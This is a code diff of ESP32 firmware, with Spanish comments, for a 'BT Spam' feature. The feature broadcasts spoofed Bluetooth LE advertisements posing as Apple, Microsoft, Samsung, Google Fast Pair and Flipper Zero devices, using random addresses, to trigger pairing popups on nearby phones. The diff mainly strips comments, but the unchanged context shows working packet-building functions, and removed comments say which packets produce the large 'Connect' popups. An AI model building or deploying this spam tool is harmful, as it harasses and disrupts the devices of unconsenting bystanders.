@@ -13,13 +13,11 @@ static const unsigned char image_Layer_9_bits[] PROGMEM = {
   0x7e,0x7e,0x7e,0x7e
 };
 
-
 enum SpamType { SPAM_APPLE, SPAM_MICROSOFT, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_FLIPPER, SPAM_TYPE_COUNT };
 
 static const char* TYPE_NAMES[SPAM_TYPE_COUNT] = {
   "Apple", "Microsoft", "Samsung", "Fast Pair (Android)", "Flipper Zero"
 };
-
 
 static SpamType activeList[SPAM_TYPE_COUNT];
 static int       activeCount = 0;
@@ -75,10 +73,9 @@ static uint32_t       packetsSent  = 0;
 
 static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }
 
-
 static void generateRandomAddr(uint8_t addr[6]) {
   for (int i = 0; i < 6; i++) addr[i] = rnd8();
-  addr[0] |= 0xC0; // top 2 bits = 11 -> static random address valida
+  addr[0] |= 0xC0;
 }
 
 static void randomName(char* out, uint8_t len) {
@@ -87,10 +84,8 @@ static void randomName(char* out, uint8_t len) {
   out[len] = '\0';
 }
 
-
 static void addApplePacket(BLEAdvertisementData &adv) {
   if (rnd8() % 10 != 0) {
-    // "Accion" (Handoff/AirDrop) -- popup mas chico y rapido
     static uint8_t raw[11];
     int i = 0;
     raw[i++] = 0x0A; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
@@ -100,7 +95,6 @@ static void addApplePacket(BLEAdvertisementData &adv) {
     raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
     adv.addData((char*)raw, i);
   } else {
-    // "Dispositivo" (AirPods/Watch/etc) -- el cartel grande de "Conectar"
     static uint8_t raw[21];
     int i = 0;
     raw[i++] = 0x14; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
@@ -138,7 +132,7 @@ static void addSamsungPacket(BLEAdvertisementData &adv) {
   raw[i++] = 14; raw[i++] = 0xFF; raw[i++] = 0x75; raw[i++] = 0x00;
   raw[i++] = 0x01; raw[i++] = 0x00; raw[i++] = 0x02; raw[i++] = 0x00; raw[i++] = 0x01;
   raw[i++] = 0x01; raw[i++] = 0xFF; raw[i++] = 0x00; raw[i++] = 0x00; raw[i++] = 0x43;
-  raw[i++] = rnd8(); // "modelo/color" -- Marauder usa una tabla real de watch models, aca va random
+  raw[i++] = rnd8();
   adv.addData((char*)raw, i);
 }
 
@@ -149,15 +143,13 @@ static void addGooglePacket(BLEAdvertisementData &adv) {
   raw[i++] = 6; raw[i++] = 0x16; raw[i++] = 0x2C; raw[i++] = 0xFE;
   raw[i++] = 0x00; raw[i++] = 0xB7; raw[i++] = 0x27;
   raw[i++] = 2; raw[i++] = 0x0A;
-  raw[i++] = (uint8_t)((rnd8() % 120) - 100); // -100 a +19 dBm, TX power falso
+  raw[i++] = (uint8_t)((rnd8() % 120) - 100);
   adv.addData((char*)raw, i);
 }
 
 static void addFlipperPacket(BLEAdvertisementData &adv) {
   static char name[6];
   randomName(name, 5);
-  // Son 27 bytes en total, NO 24 -- con raw[24] esto escribia pasado
-  // el final del arreglo y tronaba con "Stack smashing protect failure!".
   static uint8_t raw[27];
   int i = 0;
   raw[i++] = 0x02; raw[i++] = 0x01; raw[i++] = 0x06;
@@ -171,10 +163,7 @@ static void addFlipperPacket(BLEAdvertisementData &adv) {
   adv.addData((char*)raw, i);
 }
 
-
 static void applyPacket(int type) {
-  // Timeout corto (50ms): esperar a que termine el advertising anterior
-  // evita el EBUSY de setOwnAddr() que daba "setOwnAddr fallo".
   unsigned long waitStart = millis();
   while (pAdvertising->isAdvertising() && millis() - waitStart < 50) {
     delay(1);
@@ -235,7 +224,6 @@ static void stopSpam() {
   Serial.println(F("BT Spam: detenido"));
 }
 
-
 static bool isButtonJustPressed(int pin) {
   static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
   static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
@@ -265,8 +253,6 @@ static bool isButtonJustPressed(int pin) {
   }
   return false;
 }
-
-
 
 void screenBtSpamLoop() {
   if (spamming && millis() - lastRotate >= ROTATE_INTERVAL_MS) {
